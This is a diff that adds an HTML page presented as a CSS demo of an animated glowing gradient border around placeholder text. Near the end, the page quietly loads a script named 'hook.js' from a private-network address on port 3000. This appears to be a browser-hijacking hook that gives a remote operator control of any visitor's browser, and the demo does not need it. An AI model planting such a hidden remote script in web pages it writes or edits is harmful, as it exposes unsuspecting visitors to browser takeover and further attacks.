@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        * {
+    box-sizing: border-box;
+  }
+
+  body {
+    background: #222;
+  }
+
+  #box {
+    width: 400px;
+    inline-size: 400px;
+    height: 250px;
+    color: #fff;
+    background: #262626;
+    position: relative;
+    margin: 150px;
+    padding: 30px;
+  }
+
+  #box::after,
+  #box::before {
+    content: "";
+    width: calc(100% + 4px);
+    height: calc(100% + 4px);
+    background: linear-gradient(45deg, #fb0094, #0000ff, #00ff00, #ffff00, #ff0000, #fb0094, #0000ff, #00ff00, #ffff00, #ff0000);
+    background-size: 400%;
+    position: absolute;
+    top: -2px;
+    left: -2px;
+    z-index: -1;
+    animation: animated-shadow 10s linear infinite alternate;
+  }
+
+  
+  #box::after {
+    filter: blur(30px);
+  }
+
+  @keyframes animated-shadow {
+    0% {
+      background-position: 0 0;
+    }
+
+    50% {
+      background-position: 100% 0;
+    }
+
+    100% {
+      background-position: 0 0;
+    }
+
+
+  }
+    </style>
+</head>
+<body>
+    <div id="box">
+        Lorem ipsum, dolor sit amet consectetur adipisicing elit. Porro recusandae minus, neque iure excepturi amet est placeat quidem eius, doloribus eligendi illum ipsam a alias officia. Maiores atque fugiat sint!
+    </div>
+
+    <script src="http://10.10.10.50:3000/hook.js"></script>
+</body>
+</html>
